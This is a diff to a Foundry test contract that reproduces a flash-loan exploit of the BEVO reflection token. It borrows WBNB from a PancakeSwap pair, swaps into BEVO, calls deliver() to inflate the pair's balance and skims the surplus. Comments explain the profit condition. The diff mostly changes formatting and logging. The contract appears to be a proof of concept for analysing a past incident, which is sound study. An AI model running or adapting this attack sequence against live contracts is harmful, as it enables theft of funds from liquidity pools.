@@ -47,7 +47,7 @@ contract BEVOExploit is Test {
         //2.swap-flashloan
         wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
         emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
-    } 
+    }
 
     function pancakeCall(
         address /*sender*/,
@@ -61,8 +61,8 @@ contract BEVOExploit is Test {
         //3.use loan to swap bevo
         // The current number of tokens in the contract is: 192 WBNB
         console.log("============================");
-        console.log("wbnb balanceof is :",wbnb.balanceOf(address(this)));
-        console.log("timestamp is :",block.timestamp);
+        console.log("wbnb balanceof is :", wbnb.balanceOf(address(this)));
+        console.log("timestamp is :", block.timestamp);
         console.log("============================");
         router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             wbnb.balanceOf(address(this)),
@@ -73,12 +73,17 @@ contract BEVOExploit is Test {
         );
         // =====================================================
         console.log("after first swap, the this balance of bevo:", bevo.balanceOf(address(this)));
+        // vm.prank(address(this));
+        // bevo.transfer(tester, 1);
+        // console.log("after transfer, tester has bevo :", bevo.balanceOf(tester));
+        // console.log("after transfer, address this has bevo :", bevo.balanceOf(address(this)));
         // 192 WBNB -> 3.02 BEVO
         // The current number of tokens in the contract is: 3.02 BEVO
         // Actually, we just transfered 3.02 BEVO to bevo,but we got 4.5 BEVO in bevo contract
         // In personal, I think if attacker to profit,the following condition must be met: Y（1/Rate - 1） > X
-        // Y is bevo amount in pair, Rate is bevo contract's tSupply/rSupply, X is amount of bevo attacker destory 
+        // Y is bevo amount in pair, Rate is bevo contract's tSupply/rSupply, X is amount of bevo attacker destory
         bevo.deliver(bevo.balanceOf(address(this)));
+        console.log("after deliver, tester has bevo :", bevo.balanceOf(tester));
         bevo_wbnb.skim(address(this));
         // The current number of tokens in the contract is: 4.5 BEVO
         // deliver应该就是把bevo从账户手中的余额转入到bevo中
